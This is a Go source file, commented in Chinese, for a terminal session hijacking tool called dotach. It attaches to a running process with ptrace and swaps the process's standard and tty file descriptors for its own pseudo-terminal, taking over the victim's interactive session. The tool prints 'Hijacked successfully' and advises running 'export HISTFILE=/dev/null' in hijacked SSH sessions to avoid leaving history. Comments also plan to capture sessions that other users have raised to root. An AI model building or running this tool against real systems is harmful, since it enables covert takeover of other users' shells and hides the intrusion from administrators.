package dotach

import (
	"fmt"
	"golang.org/x/term"
	"io"
	"log"
	"os"
	"os/signal"
	"sync"
	"syscall"
)

type Dotach struct {
	tracer    *Tracer
	proc      *os.Process
	savedFds  map[int]int
	terminal  *Terminal
	doneCh    chan bool
	forceMode bool
}

// FindTraceeFds 查找tracee可用的文件描述符, 主要是3个标准文件描述符和tty文件描述符
func (d *Dotach) FindTraceeFds() (map[int]string, error) {
	log.Printf("Looking for available fds for tracee...")
	proc, err := NewProc(d.proc.Pid)
	if err != nil {
		return nil, err
	}

	// 获取全部可用的文件描述符
	// TODO 以后有机会把这里也换成用tracee去读,
	// TODO 因为有的时候低权限的tracee的proc/pid/fd是root的,
	// TODO 比如ping命令, 还没分析, 暂时不知道为什么...
	fda, err := proc.FileDescriptorAvailable()
	if err != nil {
		return nil, err
	}

	fds := make(map[int]string)

	// 只要 标准输入/标准输出/标准错误 存在就保留, 无论是不是tty文件描述符, 如果不存在, 不保留
	for i := 0; i < 3; i++ {
		if path, ok := fda[i]; ok {
			fds[i] = path
		}
	}

	// 先查找是否存在tty fds
	for k, v := range fda {
		//log.Printf("FDA: %d -> %#v", k, v)
		if ok, err := IsTerminal(v); err != nil {
			log.Println(err)
		} else if ok {
			if v == "/dev/ptmx" {
				log.Printf("Fd: %d (%#v) is a ptmx, skipped.", k, v)
				continue
			}
			fds[k] = v
			log.Printf("Fd: %d (%#v) is a terminal", k, v)
		} else {
			log.Printf("Fd: %d (%#v) is not a terminal", k, v)
		}
	}

	// 标准输入/标准输出/标准错误 也不存在tty fds , 这种情况没有劫持的必要
	if len(fds) == 0 {
		return nil, fmt.Errorf("no available file descriptor found")
	}

	return fds, nil
}

// SaveAndReplaceTraceeFds 保存并替换tracee的文件描述符(狸猫换太子)
func (d *Dotach) SaveAndReplaceTraceeFds(fds map[int]string) error {

	if d.savedFds == nil {
		d.savedFds = make(map[int]int)
	}

	// 先尝试打开tracee的ttyFd, 如果打不开, 直接返回错误, 不用保存也不用替换(最容易失败的一步)
	log.Printf("Trying to open a new tty file for tracee...")

	ttyFd, err := d.tracer.OpenFile(d.terminal.pts.Name())
	if err != nil {
		return fmt.Errorf("tracee open new tty fd failed: %s", err)
	} else {
		log.Printf("Tracee's new tty fd: %d has been opened", ttyFd)
	}

	// 打开成功后要保证能关闭, 即便后续过程出现错误
	defer func() {
		log.Printf("Closing tracee's new tty fd...")

		// tty文件描述符完成使命可以关闭了
		if result, err := d.tracer.Close(ttyFd); err != nil {
			Debug(err)
			log.Println(err)
		} else if result != 0 {
			err := fmt.Errorf("failed to close tracee's new tty fd  (errno: %d)", result)
			Debug(err)
			log.Println(err)
		} else {
			log.Printf("Tracee's new tty fd: %d has been closed", ttyFd)
		}
	}()

	log.Printf("Saving & Replacing tracee's fds...")

	for oldFd := range fds {
		// 先把tracee的 oldFd Dup到 newFd
		newFd, err := d.tracer.Dup(oldFd)
		if err != nil {
			return err
		}
		// 保存新旧fd的关系
		d.savedFds[oldFd] = newFd

		log.Printf("==========> Saved old fd: %d to new fd: %d (path: %s) <==========", oldFd, newFd, fds[oldFd])

		// 再用ttyFd替换oldFd, 完成文件描述符的狸猫换太子
		if _, err := d.tracer.Dup3(ttyFd, oldFd); err != nil {
			return fmt.Errorf("failed to replace tracee's original fd: %s , dup3(%d, %d)", err, ttyFd, oldFd)
		}
	}

	return nil
}

// Proxy 交互数据并等待结束信号
func (d *Dotach) Proxy() error {

	if oldState, err := term.MakeRaw(0); err == nil {
		//_ = oldState
		defer func() {
			_ = term.Restore(0, oldState)
		}()
	} else {
		return err
	}

	ptm := d.terminal.ptm

	done := func() {
		_ = ptm.Close()
		d.doneCh <- true
	}

	var once sync.Once

	go func() {
		// 使用MagicCopy来检测是否想要退出程序
		_, _ = MagicCopy(ptm, os.Stdin) // stdin
		once.Do(done)
	}()

	go func() {
		_, _ = io.Copy(os.Stdout, ptm) // stdout
		once.Do(done)
	}()

	go func() {
		_, _ = io.Copy(os.Stderr, ptm) // stderr
		once.Do(done)
	}()

	return d.WatchSignal()
}

func (d *Dotach) Hijack() (err error) {

	// 先查找tracee现有的可用的文件描述符
	fds, err := d.FindTraceeFds()
	if err != nil {
		Debug(err)
		return err
	}

	// 初始化pts
	if err := d.terminal.Init(fds); err != nil {
		Debug(err)
		return err
	}

	// 预检通过, 附加进程
	if err := d.tracer.Attach(); err != nil {
		return err
	}

	defer func() {
		if err := d.tracer.Detach(); err != nil {
			log.Println(err)
		}
	}()

	// 保存并替换tracee的文件描述符为我们的tty文件描述符
	if err := d.SaveAndReplaceTraceeFds(fds); err != nil {
		Debug(err)
		return err
	}

	// TODO 考虑是否加SIGCONT使程序继续运行而不是通过Detach来让程序继续运行(其实好像没太大影响)

	// 此处不可阻塞 不然无法detach
	return nil
}

func (d *Dotach) Run() error {
	defer func() {
		if err := d.Restore(); err != nil {
			log.Println(err)
		}
	}()

	// TODO 以后有机会研究一下: 同为一个低权限用户, 但是对方使用su 或者sudo -i等方式提升为root, 能否通过这种方式来提取
	// TODO 还有就是setsid接管session 和ctty的问题
	if err := d.Hijack(); err != nil {
		Debug(err)
		return err
	}

	log.Println("=====> Hijacked successfully!!! <=====")
	log.Println("")
	log.Println("If dotach to an ssh session, remember to execute 'export HISTFILE=/dev/null'")
	log.Println("")
	log.Println("[>>> DO NOT USE 'CTRL+C' or 'CTRL+D' or 'exit' ... to detach. <<<]")
	log.Println("")
	log.Println("Use magic: 'CTRL+X CTRL+X CTRL+X' to detach!") // 'dotach666' or
	log.Println("")
	log.Println("Press [ENTER] to continue...")

	return d.Proxy()
}

// WatchSignal 等待系统信号或者magic信号
func (d *Dotach) WatchSignal() error {
	// 捕捉信号
	ch := make(chan os.Signal, 1)
	signal.Notify(ch, syscall.SIGHUP, syscall.SIGQUIT, syscall.SIGTERM, syscall.SIGINT)

	select {
	case <-d.doneCh:
		return nil
	case s := <-ch:
		switch s {
		case syscall.SIGQUIT, syscall.SIGTERM, syscall.SIGINT:
			return nil
		case syscall.SIGHUP:
			return nil
		default:
			return nil
		}

	}

	// return nil
}

func (d *Dotach) Restore() error {

	log.Println("Restoring...")
	if d.savedFds == nil || len(d.savedFds) == 0 {
		log.Println("Restore skipped.")
		return nil
	}

	if err := d.tracer.Attach(); err != nil {
		return err
	}

	defer func() {
		if err := d.tracer.Detach(); err != nil {
			log.Println(err)
		}
	}()

	// 将目标文件描述符恢复原样,并关闭我们开启的文件描述符
	for oldFd, newFd := range d.savedFds {
		if _, err := d.tracer.Dup3(newFd, oldFd); err != nil {
			return err
		}
		if _, err := d.tracer.Close(newFd); err != nil {
			return err
		}
	}

	log.Println("Restored.")
	return nil
}

func New(proc *os.Process) (*Dotach, error) {
	terminal, err := NewTerminal()
	if err != nil {
		return nil, err
	}
	return &Dotach{
		proc:     proc,
		tracer:   NewTracer(proc),
		terminal: terminal,
		doneCh:   make(chan bool, 1),
	}, nil
}
